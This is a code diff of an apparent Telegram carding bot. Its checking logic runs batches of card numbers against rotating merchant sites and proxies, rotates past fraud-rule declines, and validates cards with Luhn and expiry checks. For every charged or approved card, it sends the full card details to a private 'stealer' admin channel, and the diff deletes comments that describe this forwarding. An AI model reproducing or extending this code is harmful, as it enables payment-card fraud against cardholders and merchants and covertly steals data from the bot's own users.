@@ -149,7 +149,8 @@ async def get_user_plan_name(user_id):
                 conn.close()
                 if row:
                     p = row['plan'].lower()
-                    if any(k in p for k in ["kashim", "chirag", "darkanon"]): return "DARKANON <tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji>"
+                    if any(k in p for k in ["kashim", "chirag", "darkanon", "zlatan", "carderx"]):
+                        return "Carder X <tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji>"
                     if "root" in p: return '𝗥𝗼𝗼𝘁 <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                     if "elite" in p: return '𝗘𝗹𝗶𝘁𝗲 ⭐'
                     if "core" in p: return '𝗖𝗼𝗿𝗲 <tg-emoji emoji-id="5042274086332400375">🛠️</tg-emoji>'
@@ -173,8 +174,7 @@ def load_sites() -> List[str]:
             return []
         with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
             sites = [line.strip() for line in f if line.strip()]
-            
-            # Filter banned sites
+
             banned_path = os.path.join(os.path.dirname(SITES_FILE), "banned_sites.json")
             if os.path.exists(banned_path):
                 try:
@@ -252,7 +252,6 @@ def get_sort_priority(response_text: str) -> int:
 # CORE CHECKING LOGIC  (new API + proxy rotation)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-# Responses that mean "try a different site / proxy" — not a real card decline
 ROTATION_TRIGGERS = [
     'validation_custom', 'decision_rule_block',
     'merchandise_expected_price_mismatch',
@@ -312,12 +311,10 @@ async def check_card_logic(sites: List[str], cc: str, proxies: List[str]) -> Dic
     while rotation_count < MAX_SITE_ROTATIONS:
         rotation_count += 1
 
-        # Fresh site every attempt
         candidates = [s for s in sites if s != last_site] or sites
         current_site = random.choice(candidates)
         last_site = current_site
 
-        # Fresh proxy every attempt
         raw_proxy = random.choice(proxies)
         proxy = normalize_proxy(raw_proxy)
         api_proxy = proxy
@@ -405,7 +402,7 @@ async def check_card_logic(sites: List[str], cc: str, proxies: List[str]) -> Dic
 
                     needs_rotation = fake_charge_detected or any(t in lower for t in ROTATION_TRIGGERS)
                     if needs_rotation:
-                        continue  # next iteration = new site + new proxy
+                        continue
 
                     return {
                         "card": cc,
@@ -461,7 +458,6 @@ async def sh_command(message: types.Message):
         await message.reply("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> No sites found.", parse_mode="HTML")
         return
 
-    # Fetch user proxies
     user_proxies = await get_user_proxies(user_id)
     if not user_proxies:
         await message.reply(
@@ -472,7 +468,6 @@ async def sh_command(message: types.Message):
         )
         return
 
-    # ─── Extract cards from command text, replies, and attachments ───
     raw_text = ""
     cmd_text = message.text or message.caption or ""
     parts = cmd_text.split(maxsplit=1)
@@ -486,7 +481,6 @@ async def sh_command(message: types.Message):
         elif replied.caption:
             raw_text += replied.caption + "\n"
 
-    # Handle document attachment
     document = message.document
     if not document and message.reply_to_message:
         document = message.reply_to_message.document
@@ -524,7 +518,6 @@ async def sh_command(message: types.Message):
         )
         return
 
-    # ─── Extract & deduplicate ───────────────────────────────────────
     extracted = extract_cards(raw_text)
     if not extracted:
         await message.reply("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> No valid cards found.")
@@ -537,7 +530,6 @@ async def sh_command(message: types.Message):
             seen.add(card)
             unique_cards.append(card)
 
-    # ─── Validate (Luhn + expiry) ────────────────────────────────────
     final_valid_cards = []
     luhn_fail_count = 0
     expired_count = 0
@@ -628,8 +620,7 @@ async def run_sh_check(
             try:
                 res = task.result()
                 results.append(res)
-                
-                # Check for charged or insufficient funds to send to logs/stealer
+
                 symbol = res.get("symbol", "")
                 resp_text = str(res.get("resp", "")).lower()
                 is_charged = f'emoji-id="{CUSTOM_CHARGED_EMOJI_ID}"' in symbol
@@ -637,7 +628,7 @@ async def run_sh_check(
 
                 if is_charged or is_insufficient:
                     hit_type = "CHARGED" if is_charged else "APPROVED"
-                    
+
                     card_parts = res['card'].split('|')
                     if len(card_parts) >= 1:
                         cc = card_parts[0]
@@ -666,7 +657,6 @@ async def run_sh_check(
                         bold_country = to_math_bold(country_val)
                         bold_username = to_math_bold(user_name)
 
-                        # Logs Caption (Clean 4 lines)
                         hit_emoji = "💎" if hit_type == "CHARGED" else "✅"
                         caption_logs = (
                             f"<b>Hit ➔</b> {hit_type} {hit_emoji}\n"
@@ -678,7 +668,6 @@ async def run_sh_check(
                             [InlineKeyboardButton(text="𝗖𝗵𝗲𝗰𝗸 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀", url="https://t.me/lightxHub_bot", style="primary")]
                         ])
 
-                        # Stealer Caption (Full Card Details)
                         caption_stealer = (
                             f"<b><tg-emoji emoji-id='5386367538735104399'>🆕</tg-emoji> {bold_hit}! {symbol}</b>\n\n"
                             f"<b><tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> {to_math_bold('CC:')}</b> <code><b>{res['card']}</b></code>\n"
@@ -693,7 +682,6 @@ async def run_sh_check(
                             f"<b><tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> {to_math_bold('Checked by:')}</b> <a href='tg://user?id={user_id}'><b>{bold_username}</b></a>"
                         )
 
-                        # Broadcast to Logs channel (@lightXhub1) with Masked Card
                         await safe_send_message(message.bot,
                             chat_id=-1004462990283,
                             text=caption_logs,
@@ -701,7 +689,6 @@ async def run_sh_check(
                             reply_markup=reply_markup_logs
                         )
 
-                        # Broadcast to Stealer / Admins channel (-1004348615901) with Full Card
                         await safe_send_message(message.bot,
                             chat_id=-1004348615901,
                             text=caption_stealer,
@@ -731,7 +718,6 @@ async def run_sh_check(
     elapsed_final = round(time.time() - start_time, 2)
     SH_SESSIONS[msg_id]["elapsed_final"] = elapsed_final
 
-    # ─── Stats ───────────────────────────────────────────────────────
     charged_count = sum(
         1 for r in results
         if f'emoji-id="{CUSTOM_CHARGED_EMOJI_ID}"' in r.get("symbol", "")
